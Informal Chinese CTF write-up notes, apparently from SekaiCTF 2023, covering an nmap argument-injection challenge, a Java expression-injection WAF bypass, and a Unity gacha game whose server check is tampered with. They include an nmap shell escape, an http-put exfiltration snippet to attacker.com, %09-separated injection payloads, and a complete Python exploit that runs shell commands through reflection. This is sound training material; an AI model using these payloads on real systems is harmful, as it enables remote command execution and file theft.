# web
### Scanner Service
ruby写的一个nmap扫描器
```ruby
  post '/' do
    input_service = escape_shell_input(params[:service])
    hostname, port = input_service.split ':', 2
    begin
      if valid_ip? hostname and valid_port? port
        # Service up?
        s = TCPSocket.new(hostname, port.to_i)
        s.close
        # Assuming valid ip and port, this should be fine
        @scan_result = IO.popen("nmap -p #{port} #{hostname}").read
      else
        @scan_result = "Invalid input detected, aborting scan!"
      end
    rescue Errno::ECONNREFUSED
      @scan_result = "Connection refused on #{hostname}:#{port}"
    rescue => e
      @scan_result = e.message
    end

    erb :'index'
  end
```
一眼命令执行,但是过滤了n多符号
```ruby
#判断ip合法性
def valid_ip?(input)
  pattern = /\A((25[0-5]|2[0-4]\d|[01]?\d{1,2})\.){3}(25[0-5]|2[0-4]\d|[01]?\d{1,2})\z/
  !input.nil? and !!(input =~ pattern)
end
#转义输入
def escape_shell_input(input_string)
  escaped_string = ''
  input_string.each_char do |c|
    case c
    when ' '
      escaped_string << '\\ '
    when '$'
      escaped_string << '\\$'
    when '`'
      escaped_string << '\\`'
    when '"'
      escaped_string << '\\"'
    when '\\'
      escaped_string << '\\\\'
    when '|'
      escaped_string << '\\|'
    when '&'
      escaped_string << '\\&'
    when ';'
      escaped_string << '\\;'
    when '<'
      escaped_string << '\\<'
    when '>'
      escaped_string << '\\>'
    when '('
      escaped_string << '\\('
    when ')'
      escaped_string << '\\)'
    when "'"
      escaped_string << '\\\''
    when "\n"
      escaped_string << '\\n'
    when "*"
      escaped_string << '\\*'
    else
      escaped_string << c
    end
  end
```

其中空格可以用`%09`代替

---
忘了上[gtfobin](https://gtfobins.github.io)查找了,,,
nmap支持自定义脚本
```shell
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```

可以看到脚本内容支持python的os模块
1. 上传文件到服务器(替换空格为%09)

```shell
RHOST=attacker.com
RPORT=8080
LFILE=file_to_send
nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
```

payload1=`54.255.166.12:80%09--script%09http-fetch%09--script-args%09http-fetch.destination=/tmp,http-fetch.url=shell`
2. 加载本地脚本
```shell
TF=$(mktemp)
echo 'os.execute("cat /flag*")' > $TF
nmap --script=$TF
```
payload2=`54.255.166.12:80%09--script=/tmp/54.255.166.12/80/shell`
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230829173140.png)

---
另一解法
```shell
service=127.0.0.1%3A30851%09-iL%09/flag-????????????????????????????????.txt%09-oN%09-%09
```
我记得我尝试过,但是没成功输出
### frog-waf
#ssti/java
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230827194115.png)

`addContact` -> 增加contact
/ 主页面
其中 `first name`,`last name`,`description` 都用正则表达式限制了,唯一可控输入点在`country`这
而该字段也由`frog-waf`过滤

```java
public enum AttackTypes {
    SQLI("\"", "'", "#"),
    XSS(">", "<"),
    OS_INJECTION("bash", "&", "|", ";", "`", "~", "*"),
    CODE_INJECTION("for", "while", "goto", "if"),
    JAVA_INJECTION("Runtime", "class", "java", "Name", "char", "Process", "cmd", "eval", "Char", "true", "false"),
    IDK("+", "-", "/", "*", "%", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
```

还没看出来有啥漏洞,已经被waf防死了

---
先贴脚本
```python
import requests
import json
import re

host = 'frog-waf.chals.sekai.team'

N = json.loads(open('numbers.json').read())

def send_payload(payload):
    r = requests.post(f'http://{host}/addContact', json = {
        "firstName": "Aaaa",
        "lastName": "Aaaa",
        "description": "Aaaa",
        "country": payload.strip()
    })
    return r.json()['violations'][0]['message'].replace(' is not a valid country', '')

def pwn(payload):
    global N
    payload = re.sub(r'\d+', lambda x: N[x.group(0)], payload)
    return send_payload(f'${{ {payload} }}')

def s(string):
    r = ''
    for i in range(len(string)):
        r += f'{Character}.getMethods()[39].invoke(null,{ord(string[i])})[0].toString()'
        if i != len(string) - 1:
            r += '.concat('
    r += ')' * (len(string) - 1)
    return r

true = '(null eq null)'
String = f'{true}.toString().getClass()'
Character = f'{String}.getMethods()[22].invoke({true}.toString(),0).getClass()'
Class = f'{true}.getClass().getClass()'
Runtime = f'{Class}.getMethods()[2].invoke(null,{s("java.lang.Runtime")})'
Scanner = f'{Class}.getMethods()[2].invoke(null,{s("java.util.Scanner")})'

cmd = "sh -c cat${IFS}/flag*"
cmd_stream = f'{Runtime}.getMethods()[6].invoke(null).exec({s(cmd)}).getInputStream()'

flag = pwn(f'{Scanner}.getConstructors()[1].newInstance({cmd_stream}).nextLine()')

print(flag)
```

java的ssti

# reverse
#unity
### Azusawa’s Gacha World
一个unity抽卡游戏,一百万次才能抽到,ce能修改金币数,但是得一百万次...
使用`dnlpy`打开`.\Managed\Assembly-CSharp.dll`,根据函数调用一直回溯到
```c#
public IEnumerator SendGachaRequest(int numPulls)
{
	string json = JsonUtility.ToJson(new GachaRequest(this.gameState.crystals, this.gameState.pulls, numPulls));
	// 让人疑惑的就是竟然会发送web请求,跟进这个函数
	using (UnityWebRequest request = this.CreateGachaWebRequest(json))
	{
		yield return request.SendWebRequest();
		if (request.result == UnityWebRequest.Result.Success)
		{
			this.HandleGachaResponse(request.downloadHandler.text, numPulls);
			GachaResponse gachaResponse = JsonUtility.FromJson<GachaResponse>(request.downloadHandler.text);
			base.StartCoroutine(this.uiManager.DisplaySplashArt(gachaResponse.characters));
}

---------------------
private UnityWebRequest CreateGachaWebRequest(string json)
{
	byte[] bytes = Encoding.UTF8.GetBytes(json);
	string s = "aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh";
	UnityWebRequest unityWebRequest = new UnityWebRequest(Encoding.UTF8.GetString(Convert.FromBase64String(s)), "POST");
	unityWebRequest.uploadHandler = new UploadHandlerRaw(bytes);
	unityWebRequest.downloadHandler = new DownloadHandlerBuffer();
	unityWebRequest.SetRequestHeader("Content-Type", "application/json");
	unityWebRequest.SetRequestHeader("User-Agent", "SekaiCTF");
	return unityWebRequest;
}
```

原来校验是在web端,所以直接打开fiddler进行一个抓包

```http
POST http://172.86.64.89:3000/gacha HTTP/1.1
Host: 172.86.64.89:3000
Accept: */*
Accept-Encoding: deflate, gzip
Connection: Keep-Alive
Content-Type: application/json
User-Agent: SekaiCTF
X-Unity-Version: 2021.3.29f1
Content-Length: 39

{"crystals":100,"pulls":0,"numPulls":1}
```
猜测pulls是请求数,修改为999999,即下一次出flag
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230827031808.png)
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230827031836.png)

### Guardians of the Kernel
针对内核的逆向,第一次见
提供了两个文件
`initramfs.cpio.gz` (临时的文件系统)
`bzImage`

> The bzImage compresses the Linux kernel image, the brain and core of your computer's operation.
> initramfs offers a temporary file system equipped with essentials, drivers, and tools for mounting the root file system. Think of it as the setup crew before the main event.


# pwn

# crypto

# Misc


---
# *相关wp*




2023-08-27   00:13